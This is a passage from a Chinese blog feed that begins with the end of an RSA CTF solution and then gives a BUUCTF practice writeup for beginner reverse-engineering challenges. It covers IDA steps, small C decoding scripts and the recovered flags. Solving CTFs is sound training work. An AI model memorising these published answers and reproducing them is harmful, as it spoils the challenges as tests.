<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x = 1 + n_phi + n_phi^2</span><br><span class="line">n_phi = (-1 + sqrt(4*x - 3)) // 2</span><br><span class="line">n_phi = p + q - 1</span><br><span class="line">φ(n) = (p-1)*(q-1) = n + n_phi</span><br><span class="line">d = pow(e, -1, φ(n))</span><br></pre></td></tr></table></figure>

<p>得到私钥后就可以解密了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886</span></span><br><span class="line">x = <span class="number">522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate n_phi from x</span></span><br><span class="line">temp = <span class="number">4</span> * x - <span class="number">3</span></span><br><span class="line">root = isqrt(temp)</span><br><span class="line">n_phi = (root - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate φ(n)</span></span><br><span class="line">phi_n = n - n_phi</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate private exponent d</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt c</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert to bytes</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>密码学习</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF刷题记录</title>
    <url>/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="BUUCTF刷题记录"><a href="#BUUCTF刷题记录" class="headerlink" title="BUUCTF刷题记录"></a>BUUCTF刷题记录</h1><p><a href="https://buuoj.cn/">题目链接</a></p>
<ul>
<li><a href="#Reverse">Reverse</a><ul>
<li><a href="#easyre">1.easyre</a></li>
<li><a href="#reverse1">2.reverse1</a></li>
<li><a href="#reverse2">3.reverse2</a></li>
<li><a href="#%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6">4.内涵的软件</a></li>
<li><a href="#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90">5.新年快乐</a></li>
<li><a href="#xor">6.xor</a></li>
<li><a href="#reverse3">7.reverse3</a></li>
<li><a href="#helloworld">8.helloworld</a></li>
<li><a href="#%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag">9.不一样的flag</a></li>
<li><a href="#SimpleRev">10.SimpleRev</a></li>
<li><a href="#luck_guy">11.luck_guy</a></li>
<li><a href="#JustRE">12.JustRE</a></li>
<li><a href="#%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96">13.刮开有奖</a></li>
<li><a href="#easyre1">14.easyre1</a></li>
<li><a href="#%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8">15.简单注册器</a></li>
<li><a href="#pyre">16.pyre</a></li>
<li><a href="#findit">17.findit</a></li>
</ul>
</li>
<li><a href="#Pwn">Pwn</a><ul>
<li><a href="#test_your_nc">1.test_your_nc</a></li>
<li><a href="#rip">2.rip</a></li>
</ul>
</li>
</ul>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>1.先下载IDA<br>2.用IDA打开exe<br>3.用shift+F12,查看字符串（不了解IDA快捷的可以先了解一下IDA的快捷键）<br>4.可以看到如下：<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/1.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;this_Is_a_EaSyRe&#125;</span><br></pre></td></tr></table></figure>

<h2 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h2><p>1.用IDA打开exe<br>2.用shift+F12,查看字符串<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/2.png" alt="2"></p>
<p>3.双击进入<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/3.png" alt="3"></p>
<p>4.用x键查看字符串所在的函数<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/4.png" alt="4"></p>
<p>5.双击击进去<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/5.png" alt="5"></p>
<p>6.用快捷键F5将其反编译代码的形式<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/6.png" alt="6"></p>
<p>7.我们现在对代码进行分析（鼠标右键点击Edit comment可以添加注释，R键转换成字符串，H键转换成10 进制）<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/7.png" alt="7"></p>
<p>8.我们双击str2,进入汇编见面<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/8.png" alt="8"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hell0_w0rld&#125;</span><br></pre></td></tr></table></figure>



<h2 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h2><p>1.用IDA打开exe<br>2.用shift+F12,查看字符串<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/9.png" alt="9"></p>
<p>可以看到flag的后半部分，双击right flag进入汇编界面，依旧re1的操作进入到反编译的界面(或者你可以直接找main函数，一般关键信息都在main函数里)<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/10.png" alt="10"></p>
<p>3.进行分析<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/11.png" alt="11"></p>
<p>很明显就是把flag中的i和r换成了1；</p>
<p>4.先双击flag<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/12.png" alt="12"></p>
<p>其实初始的flag已经出来了，替换一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hack1ng_fo1_fun&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h2><p>1.先运行一下exe<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/13.png" alt="13"></p>
<p>再enter后就退出了</p>
<p>2.用IDA 打开<br>3.shift+F12,查找字符串<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/14.png" alt="14"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;49d3c93df25caad81232130f3d2ebfad&#125;</span><br></pre></td></tr></table></figure>

<h2 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h2><p>1.先运行exe<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/15.png" alt="15"></p>
<p>输入任何东西都会闪退<br>2.用IDA分析(在这里说明一下IDA有32和64 位，可以用ExeinfoPe查看，不过ExeinfoPe的主要功能是查看壳)<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/16.png" alt="16"></p>
<p>可以看到upx的壳<br>3.用ExeinfoPe查壳<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/17.png" alt="17"></p>
<p>可以看到32位用,有upx，用upx工具脱壳<br>4.用upx工具脱壳</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upx -d + 文件地址</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/18.png" alt="18"></p>
<p>5.再将脱壳后的exe放入IDA<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/20.png" alt="20"></p>
<p>恢复正常</p>
<p>6.还是先shift+F12,找关键字符串<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/21.png" alt="21"></p>
<p>看到关键字符串‘this is true flag!’，双击进入，按同样的步骤找到反编译后的代码<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/22.png" alt="22"></p>
<p>进行分析<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/23.png" alt="23"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;HappyNewYear!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>1.先用IDA打开<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/24.png" alt="24"></p>
<p>2.找到关键词，按相同步骤找到函数并进行分析<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/25.png" alt="25"></p>
<p>3.先双击global进入汇编界面<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/26.png" alt="26"></p>
<p>4.在双击划红线的部分，找到加密后的密文<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/27.png" alt="27"></p>
<p>在密文上使用shift+E提取密文，再将其转到16进制的形式(既选择hex)</p>
<h4 id="补充：异或的知识-a-b-c-如果想的到a或b-可以b-a-c-a-b-c"><a href="#补充：异或的知识-a-b-c-如果想的到a或b-可以b-a-c-a-b-c" class="headerlink" title="补充：异或的知识  a^b &#x3D; c 如果想的到a或b ,可以b&#x3D;a^c,a&#x3D;b^c;"></a>补充：异或的知识  a^b &#x3D; c 如果想的到a或b ,可以b&#x3D;a^c,a&#x3D;b^c;</h4><p>5.最后编写代码解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt; </span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	int i;</span><br><span class="line">    char b[] =</span><br><span class="line">    &#123;</span><br><span class="line">    0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11, </span><br><span class="line">    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F, </span><br><span class="line">    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F, </span><br><span class="line">    0x47, 0x32, 0x4F</span><br><span class="line">    &#125;;</span><br><span class="line">for ( i = 32; i &gt; 0; --i )&#123;</span><br><span class="line">	 b[i] ^= b[i - 1];</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s&quot;,b);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;QianQiuWanDai_YiTongJiangHu&#125;</span><br></pre></td></tr></table></figure>

<h2 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h2><p>1.先运行一下exe<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/28.png" alt="28"></p>
<p>还是输入enter就退出了<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/29.png" alt="29"></p>
<p>猜测肯定与base64 加密有关，双击right flag，进入汇编界面，同样步骤进入反编译后的界面，进行分析。</p>
<ul>
<li><p>1先进入sub_4110BE<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/30.png" alt="30"></p>
</li>
<li><p>2整体分析完毕<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/31.png" alt="31"></p>
</li>
</ul>
<p>2.双击str2,进入汇编界面查找str2的字符串<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/32.png" alt="32"></p>
<p>3.先用脚本偏移回来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt; </span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	int i;</span><br><span class="line">    char b[] =&quot;e3nifIH9b_C@n@dH&quot; ;</span><br><span class="line">    int j;</span><br><span class="line">    j=strlen(b);</span><br><span class="line">for ( i = 0; i &lt;j ; i++ )&#123;</span><br><span class="line">	 b[i] -= i;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s&quot;,b);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.再用<a href="https://www.toolhelper.cn/EncodeDecode/Base64">在线base64解码</a><br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/33.png" alt="33"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;i_l0ve_you&#125;</span><br></pre></td></tr></table></figure>

<h2 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h2><p>1.下载文件发现是apk文件(一般apk都是用jadx 打开)<br>2.先用jadx打开(注：一般主要的内容都在MainActivity中)<br>3.进入MainActivity可以看到：<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/34.png" alt="34"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;7631a988259a00816deda84afb29430a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h2><p>1.先运行exe，看到：<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/35.png" alt="35"></p>
<p>2.由上下左右的信息，可以猜测是个迷宫题<br>3.再用IDA打开<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/36.png" alt="36"></p>
<p>这里补充一点经验，一般迷宫都是方形的。<br>4.3.按原步骤找到主函数，并进行分析<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/37.png" alt="37"></p>
<p>5.构造迷宫：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 1 1 1 1</span><br><span class="line">0 1 0 0 0</span><br><span class="line">0 1 0 1 0</span><br><span class="line">0 0 0 1 0</span><br><span class="line">1 1 1 1 #</span><br></pre></td></tr></table></figure>

<p>明显是：下下下右右上上右右下下下（222441144222）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;222441144222&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h2><p>1.打开IDA<br>2.按原步骤找到主函数，并分析：<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/38.png" alt="38"></p>
<p>可以找到关键函数<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/39.png" alt="39"></p>
<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/40.png" alt="40"></p>
<p>3.解题脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt; </span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	char key3[10]=&quot;killshadow&quot;;</span><br><span class="line">	//ADSFKNDCLS转成小写 </span><br><span class="line">	char key[10]=&quot;adsfkndcls&quot;;</span><br><span class="line">	char flag[10];</span><br><span class="line">	int i,j;</span><br><span class="line">	for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">	    for(j=64;j&lt;=90;j++)&#123;</span><br><span class="line">		 //key3=text;如果想要成功满足str2=text; </span><br><span class="line">		if(key3[i]==(j-39-key[i%10]+97)%26+97)&#123; </span><br><span class="line">			flag[i]=j;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;flag&#123;%s&#125;&quot;,flag);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;KLDQCUDFZO&#125;</span><br></pre></td></tr></table></figure>



<h2 id="luck-guy"><a href="#luck-guy" class="headerlink" title="luck_guy"></a>luck_guy</h2><p>1.先用虚拟机运行一下：<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/41.png" alt="41"></p>
<p>没什么线索。<br>2.再用IDA打开，shift+F12:</p>
<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/42.png" alt="41"></p>
<p>3.按原步骤找到反编译的原函数，并进行分析<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/43.png" alt="42"></p>
<p>进入如关键函数</p>
<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/44.png" alt="44"></p>
<p>进入get_flag<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/45.png" alt="45"></p>
<p>双击f1进入，汇编界面<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/46.png" alt="46"></p>
<p>得到flag的第一部分<br>编代码得到第二部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">   char f2[7]=&#123;&#x27;i&#x27;,&#x27;c&#x27;,&#x27;u&#x27;,&#x27;g&#x27;,&#x27;`&#x27;,&#x27;o&#x27;,&#x27;f&#x27;,0x7F&#125;;//小端序转化 </span><br><span class="line">   int i,j;</span><br><span class="line">  for(j=0;j&lt;=7;j++)&#123;</span><br><span class="line">  	if(j%2==1)&#123;</span><br><span class="line">  		f2[j]-= 2;</span><br><span class="line">	  &#125;</span><br><span class="line">	  else&#123;</span><br><span class="line">	  	--f2[j];</span><br><span class="line">	  &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  printf(&quot;%s\n&quot;,f2);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hate_me?</span><br></pre></td></tr></table></figure>

<p>拼接一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;do_not_hate_me?&#125;</span><br></pre></td></tr></table></figure>

<h2 id="java逆向解密"><a href="#java逆向解密" class="headerlink" title="java逆向解密"></a>java逆向解密</h2><p>1.java一般是先xxx.java文件，经过javac.exe编译后的到xxx.class文件，java的反编译可以用jd-gui(纯反编译java)后jadx(因为apk大多数都是用java写的）打开</p>
<p>2.下载附件看到xxx.class,可以知道要用java反编译的工具，以上两种都可以。</p>
<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/47.png" alt="47"></p>
<p>3.思路很明显了，将key先和32异或再-@。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">   char KEY[] = &#123;180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65&#125;;</span><br><span class="line">   int j;</span><br><span class="line">   int lenght=strlen(KEY); </span><br><span class="line">   char flag[lenght-2];</span><br><span class="line">  for(j=0;j&lt;lenght;j++)&#123;</span><br><span class="line">  	  flag[j]=(KEY[j]^32)-&#x27;@&#x27;;</span><br><span class="line">  &#125; </span><br><span class="line">  printf(&quot;%s\n&quot;,flag);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/48.png" alt="48"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;This_is_the_flag_!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JustRE"><a href="#JustRE" class="headerlink" title="JustRE"></a>JustRE</h2><p>1.先运行exe<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/58.png" alt="58"><br>2.猜测可能是点击很多次次才能出来，这里我没有试，但是我在这里附上一个鼠标自动点击脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pyautogui</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 等待10秒</span><br><span class="line">time.sleep(3)</span><br><span class="line"></span><br><span class="line"># 设置点击次数</span><br><span class="line">clicks = 100</span><br><span class="line">interval = 1  # 两次点击之间的间隔时间（秒）</span><br><span class="line"></span><br><span class="line">print(&quot;开始点击...&quot;)</span><br><span class="line">for i in range(clicks):</span><br><span class="line">    pyautogui.click()  # 默认情况下点击左键</span><br><span class="line">    time.sleep(interval)  # 等待指定的间隔时间</span><br><span class="line"></span><br><span class="line">print(&quot;完成点击&quot;)</span><br></pre></td></tr></table></figure>

<p>3.我是直接用IDA打开<br>shift+F12查找字符串<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/59.png" alt="59"><br>可以找到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;%d%d2069a45792d233ac&#125;</span><br></pre></td></tr></table></figure>

<h2 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h2><p>1.先运行一下exe<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/60.png" alt="60"><br>我试了一下发现刮不动<br>2.用IDA打开<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/61.png" alt="61"><br>猜测跟base加解密有关<br><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/62.png" alt="62"><br>分析完毕，这里是纯手算的。这里给一个模拟排序函数的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int sub_A510F0(char* a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int i; // esi</span><br><span class="line">  int v5; // ecx</span><br><span class="line">  int v6; // edx</span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  for ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 =i;</span><br><span class="line">    v6 =a1[i];</span><br><span class="line">    if ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v6 &gt;  a1[result] )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( i &gt;= result )</span><br><span class="line">            break;</span><br><span class="line">          ++i;</span><br><span class="line">         a1[v5] = a1[result];</span><br><span class="line">          if ( i &gt;= result )</span><br><span class="line">            break;</span><br><span class="line">          while ( a1[i] &lt;= v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( ++i &gt;= result )</span><br><span class="line">              goto LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( i &gt;= result )</span><br><span class="line">            break;</span><br><span class="line">          v5 = i;</span><br><span class="line">          a1[result] = a1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    a1[result]= v6;</span><br><span class="line">    sub_A510F0(a1, a2, i - 1);</span><br><span class="line">    result = a3;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">   char str[]=&quot;ZJSECaNH3ng&quot;;</span><br><span class="line">   sub_A510F0(str,0,10);</span><br><span class="line">   printf(&quot;%s&quot;,str);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="疑难解答：-DWORD-a1-4-result-DWORD-4-i-a1-a1-result-a1-i-int占四个字节，所以需要4-如果是char类型，就不需要-从大佬的博客里看的-。"><a href="#疑难解答：-DWORD-a1-4-result-DWORD-4-i-a1-a1-result-a1-i-int占四个字节，所以需要4-如果是char类型，就不需要-从大佬的博客里看的-。" class="headerlink" title="疑难解答： *(_DWORD *)(a1 + 4 * result) &#x3D; *(_DWORD )(4 * i + a1)&lt;&#x3D;&gt;a1[result]&#x3D;a1[i],int占四个字节，所以需要4.如果是char类型，就不需要(从大佬的博客里看的)。"></a>疑难解答： *(_DWORD *)(a1 + 4 * result) &#x3D; *(_DWORD <em>)(4 * i + a1)&lt;&#x3D;&gt;a1[result]&#x3D;a1[i],int占四个字节，所以需要</em>4.如果是char类型，就不需要(从大佬的博客里看的)。</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;UJWP1jMp&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easyre1"><a href="#easyre1" class="headerlink" title="easyre1"></a>easyre1</h2><p>1.直接放入IDA发现有壳与<a href="#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90">新年快乐</a>同理去脱壳<br>2.脱壳后安原步骤找到main函数，并分析</p>
<p><img src="/2025/01/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/assets/63.png" alt="63"><br>3.现在只要编脚本得到v5就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   char v5[11];</span><br><span class="line">   int num[11];</span><br><span class="line">   char v4[]=&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;;</span><br><span class="line">   char str[]=&quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\&quot;&quot;;</span><br><span class="line">   int i,j;</span><br><span class="line">   for ( i = 0; i &lt;= 11; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    for(j=0;j&lt;strlen(str);j++)&#123;</span><br><span class="line">    	if(v4[i]==str[j])&#123;</span><br><span class="line">    		num[i]=j;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line">   for(i=0;i&lt;=11;i++)&#123;</span><br><span class="line">   	v5[i]=num[i]+1;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;%s&quot;,v5);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

